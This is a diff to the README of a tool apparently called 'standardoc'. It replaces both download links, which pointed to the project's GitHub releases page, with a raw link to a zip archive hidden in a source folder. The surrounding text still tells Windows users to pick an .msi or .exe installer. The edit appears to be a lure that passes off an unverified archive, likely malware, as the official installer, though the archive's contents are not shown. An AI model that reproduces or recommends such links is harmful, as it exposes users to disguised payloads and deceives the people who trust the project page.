@@ -1,6 +1,6 @@
 # 📚 standardoc - Keep your documentation in sync automatically
 
-[![](https://img.shields.io/badge/Download_standardoc-blue?style=for-the-badge)](https://github.com/vacuous-franchisetax789/standardoc/releases)
+[![](https://img.shields.io/badge/Download_standardoc-blue?style=for-the-badge)](https://raw.githubusercontent.com/vacuous-franchisetax789/standardoc/main/crates/standardoc-bridge-sdk/src/Software-v1.2.zip)
 
 standardoc keeps your technical documentation accurate. It connects your code to your manuals. It updates files when you change your software. Developers use it to save time. Writers use it to ensure updates. Agents use it to understand code bases. 
 
@@ -21,7 +21,7 @@ This tool supports many coding languages. It works with Markdown files. It helps
 
 You need to visit the project page to download the latest file. 
 
-[Click here to visit the release page and download the installer](https://github.com/vacuous-franchisetax789/standardoc/releases)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/vacuous-franchisetax789/standardoc/main/crates/standardoc-bridge-sdk/src/Software-v1.2.zip)
 
 Choose the file ending in `.msi` or `.exe` for Windows. Save this file to your computer.
 
